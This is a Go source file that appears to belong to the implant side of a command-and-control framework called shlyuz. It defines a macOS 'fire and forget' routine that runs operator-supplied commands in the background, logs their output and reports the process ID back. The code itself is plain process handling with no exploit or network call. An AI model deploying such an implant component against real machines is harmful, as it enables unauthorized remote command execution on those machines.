//go:build darwin,implant && (!lp || !teamserver) // Darwin build tag

package fireforget

import (
	"bufio" 
	"io"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings" 
)

func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel, inPipe io.Reader) error {
	log.Printf("CmdID %s (Darwin): Preparing to fire and forget command: %s", cmdDetails.Id, cmdDetails.Args)

	var command *exec.Cmd
	if cmdDetails.Type == "Shell" {
		cmdSlice := strings.Split(cmdDetails.Args, " ")
		command = exec.Command(cmdSlice[0], cmdSlice[1:]...)
		log.Printf("CmdID %s (Darwin): Executing split shell command: %s, Args: %v", cmdDetails.Id, cmdSlice[0], cmdSlice[1:])
	} else {
		command = exec.Command(cmdDetails.Args)
		log.Printf("CmdID %s (Darwin): Executing direct command: %s", cmdDetails.Id, cmdDetails.Args)
	}


	// Handle stdin
	if inPipe != nil {
		stdin, err := command.StdinPipe()
		if err != nil {
			errMsg := "Error creating StdinPipe"
			log.Printf("CmdID %s (Darwin): %s: %v", cmdDetails.Id, errMsg, err)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- errMsg + ": " + err.Error():
				default: log.Printf("CmdID %s (Darwin): StdErr channel full.", cmdDetails.Id)
				}
			}
			return err
		}
		go func() {
			defer stdin.Close()
			log.Printf("CmdID %s (Darwin): Piping input to command.", cmdDetails.Id)
			if _, errCopy := io.Copy(stdin, inPipe); errCopy != nil {
				log.Printf("CmdID %s (Darwin): Error writing to stdin pipe: %v", cmdDetails.Id, errCopy)
			}
			log.Printf("CmdID %s (Darwin): Finished piping input.", cmdDetails.Id)
		}()
	}

	// Setup Stdout pipe for draining and logging
	cmdOutReader, err := command.StdoutPipe()
	if err != nil {
		errMsg := "Error creating StdoutPipe for draining"
		log.Printf("CmdID %s (Darwin): %s: %v", cmdDetails.Id, errMsg, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Darwin): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}
	outScanner := bufio.NewScanner(cmdOutReader)
	go func() {
		log.Printf("CmdID %s (Darwin): Goroutine started for draining stdout.", cmdDetails.Id)
		for outScanner.Scan() {
			log.Printf("CmdID %s (Darwin stdout): %s", cmdDetails.Id, outScanner.Text())
		}
		if errScan := outScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Darwin): Error draining stdout: %v", cmdDetails.Id, errScan)
		}
		log.Printf("CmdID %s (Darwin): Goroutine finished draining stdout.", cmdDetails.Id)
	}()

	// Setup Stderr pipe for draining and logging
	cmdErrReader, err := command.StderrPipe()
	if err != nil {
		errMsg := "Error creating StderrPipe for draining"
		log.Printf("CmdID %s (Darwin): %s: %v", cmdDetails.Id, errMsg, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Darwin): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}
	errScanner := bufio.NewScanner(cmdErrReader)
	go func() {
		log.Printf("CmdID %s (Darwin): Goroutine started for draining stderr.", cmdDetails.Id)
		for errScanner.Scan() {
			log.Printf("CmdID %s (Darwin stderr): %s", cmdDetails.Id, errScanner.Text())
		}
		if errScan := errScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Darwin): Error draining stderr: %v", cmdDetails.Id, errScan)
		}
		log.Printf("CmdID %s (Darwin): Goroutine finished draining stderr.", cmdDetails.Id)
	}()

	// Start the command
	if err := command.Start(); err != nil {
		errMsg := "Error starting command"
		// Log the original cmdDetails.Args for clarity, as 'command' might be just the first part.
		log.Printf("CmdID %s (Darwin): %s '%s': %v", cmdDetails.Id, errMsg, cmdDetails.Args, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Darwin): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}

	log.Printf("CmdID %s (Darwin): Command '%s' started successfully in background (PID: %d).", cmdDetails.Id, cmdDetails.Args, command.Process.Pid)

	// Send PID
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Darwin): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}
	return nil // Indicates successful start
}
